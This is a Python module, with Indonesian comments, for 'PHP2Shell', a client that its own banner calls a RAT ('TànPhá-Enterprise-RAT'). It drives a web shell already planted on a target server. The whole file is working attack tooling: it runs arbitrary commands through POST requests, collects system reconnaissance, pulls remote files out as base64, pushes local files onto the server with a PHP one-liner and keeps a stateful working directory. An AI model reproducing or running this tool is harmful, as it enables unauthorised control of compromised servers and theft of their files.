"""Modul PHP2Shell Core Engine — pindahan dari main.py legacy.

Perubahan dari legacy:
  - Import `os` dinaikkan ke atas (di legacy di-import di dalam fungsi).
  
Logika eksekusi, stateful `cd`, `upload`, `download`, dan sanitizer: IDENTIK 100%.
"""
import os
import base64
import requests


def run_php2shell_module():
    print("-" * 60)
    print(" [ Modul: PHP2Shell Enterprise Core & Stateful Command Engine ]")
    print("-" * 60)
    print("[*] Engine tingkat lanjut dengan Stateful CD, Output Sanitizer, & Built-in Tools.")
    
    shell_url = input("[?] Masukkan URL Web Shell aktif (contoh: http://target.com/uploads/shell.php): ").strip()
    password_param = input("[?] Masukkan parameter POST eksekusi (default: cmd): ").strip()
    if not password_param:
        password_param = "cmd"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TànPhá-Enterprise-RAT"
    }

    # Menyimpan state direktori aktif secara otonom (Stateful Directory Tracking)
    current_dir = ""
    try:
        init_res = requests.post(shell_url, data={password_param: "pwd"}, headers=headers, timeout=5, verify=False)
        current_dir = init_res.text.strip().split("\n")[-1]
    except:
        current_dir = "/app"

    print(f"\n[+] Sesi PHP2Shell Berhasil Dikunci ke Target!")
    print(f"[*] Ketik perintah sistem, gunakan 'cd <path>' untuk berpindah folder,")
    print(f"    atau gunakan built-in command: [sysinfo, upload <local>, download <remote>, exit]\n")

    while True:
        try:
            prompt_path = current_dir if current_dir else "shell"
            command = input(f"TànPhá-RAT:{prompt_path}# ").strip()
            if not command:
                continue
            
            lower_cmd = command.lower()

            if lower_cmd == 'exit':
                print("[*] Keluar dari sesi PHP2Shell.")
                break

            # 1. Built-in Command: SYSINFO (Ringkasan instan sistem target)
            if lower_cmd == 'sysinfo':
                sys_payload = "uname -a; id; whoami; hostname; ifconfig || ip a"
                res = requests.post(shell_url, data={password_param: sys_payload}, headers=headers, timeout=6, verify=False)
                print("\n--- Target System Information ---")
                print(res.text.strip())
                print("-" * 35 + "\n")
                continue

            # 2. Built-in Command: DOWNLOAD <remote_file>
            if lower_cmd.startswith('download '):
                r_file = command.split(' ', 1)[1].strip()
                print(f"[*] Mengunduh file dari target: {r_file}...")
                dl_payload = f"base64 {r_file}" if os.name != 'nt' else f"certutil -encode {r_file} stdout"
                res = requests.post(shell_url, data={password_param: dl_payload}, headers=headers, timeout=8, verify=False)
                
                if res.status_code == 200 and len(res.text.strip()) > 0:
                    local_out = os.path.basename(r_file)
                    try:
                        # Membersihkan output base64 dari sisa teks server
                        clean_b64 = "".join([line for line in res.text.strip().split("\n") if not line.startswith("<?")])
                        decoded_data = base64.b64decode(clean_b64)
                        with open(local_out, "wb") as f_out:
                            f_out.write(decoded_data)
                        print(f"[+] Berhasil mengunduh! Disimpan secara lokal sebagai: {local_out}\n")
                    except Exception as e:
                        print(f"[-] Gagal mendekode file download: {e}\n")
                else:
                    print("[-] Gagal mengambil file atau file tidak ditemukan di target.\n")
                continue

            # 3. Built-in Command: UPLOAD <local_file>
            if lower_cmd.startswith('upload '):
                parts = command.split(' ', 1)
                if len(parts) < 2:
                    print("[-] Format salah! Gunakan: upload <nama_file_lokal>\n")
                    continue
                l_file = parts[1].strip()
                if not os.path.exists(l_file):
                    print(f"[-] File lokal '{l_file}' tidak ditemukan!\n")
                    continue

                print(f"[*] Mengunggah file lokal '{l_file}' ke server target...")
                try:
                    with open(l_file, "rb") as f_in:
                        b64_data = base64.b64encode(f_in.read()).decode('utf-8')
                    
                    # Perintah PHP one-liner di server untuk menulis ulang file dari base64
                    upl_payload = f"php -r \"file_put_contents('{l_file}', base64_decode('{b64_data}'));\""
                    res = requests.post(shell_url, data={password_param: upl_payload}, headers=headers, timeout=8, verify=False)
                    print(f"[+] Proses upload selesai! Periksa folder target.\n")
                except Exception as e:
                    print(f"[-] Gagal mengunggah file: {e}\n")
                continue

            # 4. Stateful Directory Tracking & CD Command Handler
            if lower_cmd.startswith('cd '):
                target_folder = command.split(' ', 1)[1].strip()
                stateful_cmd = f"cd {current_dir} && cd {target_folder} && pwd"
                res = requests.post(shell_url, data={password_param: stateful_cmd}, headers=headers, timeout=5, verify=False)
                new_path = res.text.strip().split("\n")[-1].strip()
                if new_path.startswith('/'):
                    current_dir = new_path
                    print(f"[+] Direktori aktif berpindah ke: {current_dir}\n")
                else:
                    print(f"[-] Gagal berpindah direktori (Folder tidak ditemukan atau akses ditolak).\n")
                continue

            # 5. Standard Command Execution dengan Output Sanitizer (Marker Wrapper)
            marker_start = "===TP_START==="
            marker_end = "===TP_END==="
            wrapped_command = f"cd {current_dir} && echo '{marker_start}' && ({command}) 2>&1 && echo '{marker_end}'"

            response = requests.post(shell_url, data={password_param: wrapped_command}, headers=headers, timeout=6, verify=False)
            raw_output = response.text

            if marker_start in raw_output and marker_end in raw_output:
                sanitized_output = raw_output.split(marker_start)[1].split(marker_end)[0].strip()
            else:
                sanitized_output = raw_output.strip()

            print("\n--- Output Eksekusi ---")
            print(sanitized_output if sanitized_output else "[*] Perintah berhasil dieksekusi tanpa output teks.")
            print("-----------------------\n")

        except KeyboardInterrupt:
            print("\n[*] Sesi dihentikan oleh pengguna.")
            break
        except Exception as e:
            print(f"[-] Koneksi ke web shell gagal atau terputus: {e}")

    input("\nTekan Enter untuk kembali ke menu utama...")
